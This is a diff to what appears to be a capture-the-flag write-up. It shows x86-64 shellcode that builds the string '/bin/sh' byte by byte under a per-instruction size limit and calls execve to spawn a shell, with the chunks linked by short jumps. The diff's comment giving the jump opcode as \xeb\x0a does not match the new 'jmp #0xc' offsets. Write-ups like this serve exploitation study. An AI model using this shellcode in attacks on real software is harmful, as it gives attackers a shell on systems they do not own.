@@ -80,49 +80,49 @@ Pushing values by bytes (e.g. `push 0x00; push 0x68; push 0x73;` etc) does not w
 Lastly we realised we could `mov` the string `'/bin/sh'` into a register byte by byte before pushing the register's value into the stack. This is how we managed to call `execve('/bin/sh', null, null)` with assembly instructions less than 4 bytes. We cannot use all 6 bytes because the last 2 bytes are used for the `jmp` instruction to jump to the next 6 bytes. 
 ```
 xor rax, rax
-jmp #0xa
+jmp #0xc
 
 
 mov al, 0x68
 mov ah, 0x00			# rax = 0x0000000000000068
-jmp #0xa
+jmp #0xc                # opcode is \xeb\x0a
 
 shl rax, 16
-jmp #0xa
+jmp #0xc
 
 mov al, 0x2f
 mov ah, 0x73			# rax = 0x000000000068732f
-jmp #0xa
+jmp #0xc
 
 shl rax, 16
-jmp #0xa
+jmp #0xc
 
 mov al, 0x69
 mov ah, 0x6e			# rax = 0x00000068732f6e69
-jmp #0xa
+jmp #0xc
 
 shl rax, 16
-jmp #0xa
+jmp #0xc
 
 mov al, 0x2f
 mov ah, 0x62			# rax = 0x0068732f6e69622f
-jmp #0xa
+jmp #0xc
 
 push rax
 mov rdi, rsp
-jmp #0xa
+jmp #0xc
 
 xor rax, rax
-jmp #0xa
+jmp #0xc
 
 mov ax, 0x3b
-jmp #0xa
+jmp #0xc
 
 xor rsi, rsi
-jmp #0xa
+jmp #0xc
 
 xor rdx, rdx
-jmp #0xa
+jmp #0xc
 
 syscall
 ```
